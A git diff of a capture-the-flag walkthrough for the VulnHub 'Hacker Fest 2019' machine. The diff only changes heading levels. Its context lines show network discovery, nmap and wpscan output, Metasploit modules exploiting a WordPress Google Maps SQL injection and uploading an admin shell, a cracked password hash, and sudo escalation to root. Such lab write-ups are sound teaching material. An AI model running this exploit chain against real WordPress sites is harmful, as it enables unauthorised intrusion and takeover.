@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/hacker-fest-2019,378/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 192.168.1.159
@@ -98,7 +96,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 43.60 seconds
 ```
 
-### WordPress Scanner
+## WordPress Scanner
 
 ```
 $ wpscan --url http://192.168.1.159
@@ -210,7 +208,7 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:04
 ```
 
-### WordPress Google Maps SQLi Exploit
+## WordPress Google Maps SQLi Exploit
 
 ```
 $ msfconsole
@@ -253,7 +251,7 @@ msf5 auxiliary(admin/http/wp_google_maps_sqli) > exploit
 
 Credentials: **webmaster** : **$P$Bsq0diLTcye6ASlofreys4GzRlRvSrl**
 
-### Credentials Cracking
+## Credentials Cracking
 
 ```
 $ cat credentials.txt
@@ -283,7 +281,7 @@ Started: Sat Oct 10 15:14:09 2020
 Stopped: Sat Oct 10 15:14:43 2020
 ```
 
-### WordPress Admin Shell Upload Exploit
+## WordPress Admin Shell Upload Exploit
 
 ```
 msf5 > use exploit/unix/webapp/wp_admin_shell_upload
@@ -343,7 +341,7 @@ OS          : Linux HF2019-Linux 4.19.0-0.bpo.6-amd64 #1 SMP Debian 4.19.67-2~bp
 Meterpreter : php/linux
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
 ```
 meterpreter > shell
@@ -356,7 +354,7 @@ webmaster@HF2019-Linux:~$ sudo su
 root@HF2019-Linux:/home/webmaster#
 ```
 
-### Flag Acquiring
+## Flag Acquiring
 
 ```
 root@HF2019-Linux:/home/webmaster# cat /home/webmaster/flag.txt
